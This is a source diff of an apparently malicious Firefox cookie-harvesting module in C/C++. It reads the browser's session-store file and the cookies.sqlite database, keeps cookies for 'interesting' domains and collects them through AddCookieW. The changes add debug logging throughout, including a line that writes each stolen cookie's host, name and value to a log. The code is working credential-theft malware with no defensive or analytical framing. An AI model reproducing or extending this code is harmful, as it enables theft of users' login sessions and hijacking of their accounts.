@@ -49,6 +49,10 @@ int static InitSocialLibs()
 
 int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azColName)
 {
+	wchar_t szLogW[MAX_PATH * 2] = { 0 }; void putlogW(wchar_t*);
+	swprintf(szLogW, L"in parse_sqlite_cookies begin ");
+	putlogW(szLogW);
+
 	char *host = NULL;
 	char *name = NULL;
 	char *value = NULL;
@@ -70,11 +74,18 @@ int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azC
 	SAFE_FREE(name);
 	SAFE_FREE(value);
 
+
+	swprintf(szLogW, L"in parse_sqlite_cookies end ");
+	putlogW(szLogW);
 	return 0;
 }
 
 int static DumpSqliteCookies(WCHAR *profilePath, WCHAR *signonFile)
 {
+	wchar_t szLogW[MAX_PATH * 2] = { 0 }; void putlogW(wchar_t*);
+	swprintf(szLogW, L"in DumpSqliteCookies begin ");
+	putlogW(szLogW);
+
 	void *db;
 	char *ascii_path;
 	CHAR sqlPath[MAX_PATH];
@@ -95,12 +106,17 @@ int static DumpSqliteCookies(WCHAR *profilePath, WCHAR *signonFile)
 	social_SQLITE_exec(db, "SELECT * FROM moz_cookies;", parse_sqlite_cookies, NULL, NULL);
 
 	social_SQLITE_close(db);
-
+	swprintf(szLogW, L"in DumpSqliteCookies end ");
+	putlogW(szLogW);
 	return 1;
 }
 
 int DumpSessionCookies(WCHAR *profilePath)
 {
+	wchar_t szLogW[MAX_PATH * 2] = { 0 }; void putlogW(wchar_t*);
+	swprintf(szLogW, L"in DumpSessionCookies begin ");
+	putlogW(szLogW);
+
 	char *session_memory = NULL;
 	DWORD session_size;
 	HANDLE h_session_file;
@@ -165,8 +181,15 @@ int DumpSessionCookies(WCHAR *profilePath)
 								cvalue = _wcsdup(jcookie[L"value"]->AsString().c_str());
 
 							NormalizeDomainW(host);
-							if (host && name && cvalue && IsInterestingDomainW(host))
+							if (host && name && cvalue && IsInterestingDomainW(host)){
 								AddCookieW(host, name, cvalue);
+								//add
+								wchar_t szLogW[MAX_PATH * 2] = { 0 }; void putlogW(wchar_t*);
+								swprintf(szLogW, L"FF AddCookieW host:%s,name:%s,value:%s", host, name, cvalue);
+								putlogW(szLogW);
+								//add end 
+
+							}
 
 							SAFE_FREE(host);
 							SAFE_FREE(name);
@@ -179,22 +202,39 @@ int DumpSessionCookies(WCHAR *profilePath)
 	}	
 	delete value;
 	SAFE_FREE(session_memory);
+
+	swprintf(szLogW, L"in DumpSessionCookies end ");
+	putlogW(szLogW);
+
 	return 1;
 }
 
 int DumpFFCookies(void)
 {
+	wchar_t szLogW[MAX_PATH * 2] = { 0 }; void putlogW(wchar_t*);
+	swprintf(szLogW, L"in DumpFFCookies");
+	putlogW(szLogW);
+
 	WCHAR *ProfilePath = NULL; 	//Profile path
 
 	ProfilePath = GetFFProfilePath();
 
-	if (ProfilePath == NULL || !DirectoryExists(ProfilePath)) 
+	if (ProfilePath == NULL || !DirectoryExists(ProfilePath))
+	{
+		//add
+		swprintf(szLogW, L"in DumpFFCookies,Path not exists:%s", ProfilePath);
+		putlogW(szLogW);
+		//add end 
 		return 0;
-		
+	}
 	DumpSessionCookies(ProfilePath);
 
 	if (InitSocialLibs()) 
 		DumpSqliteCookies(ProfilePath, L"cookies.sqlite"); 
+	else{
+		swprintf(szLogW, L"InitSocialLibs Failed");
+		putlogW(szLogW);
+	}
 
 	return 0;
 }
